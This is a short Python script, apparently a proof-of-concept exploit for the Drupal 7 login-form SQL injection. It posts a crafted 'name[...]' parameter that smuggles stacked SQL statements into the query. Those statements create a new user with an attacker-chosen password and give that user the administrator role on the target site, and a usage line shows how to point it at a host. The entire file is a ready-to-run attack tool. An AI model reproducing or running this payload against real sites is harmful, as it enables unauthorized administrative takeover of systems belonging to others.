#!/usr/bin/env python

import urllib2,sys 
from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py 
if len(sys.argv) != 4: 
    print "" 
    print "python 7.xSQL.py  http://xxoo.com/drupal admin 123456" 
    print "" 
    sys.exit(1) 
host = sys.argv[1] 
user = sys.argv[2] 
password = sys.argv[3] 
hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash() 
target = '%s/?q=node&destination=node' % host 
insert_user = "name[0%20;set+@a%3d%28SELECT+MAX%28uid%29+FROM+users%29%2b1;INSERT+INTO+users+set+uid%3d@a,status%3d1,name%3d\'" \ 
            +user \ 
            +"'+,+pass+%3d+'" \ 
            +hash[:55] \ 
            +"';INSERT+INTO+users_roles+set+uid%3d@a,rid%3d3;;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in" 
#print insert_user 
content = urllib2.urlopen(url=target, data=insert_user).read() 
if "mb_strlen() expects parameter 1" in content: 
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
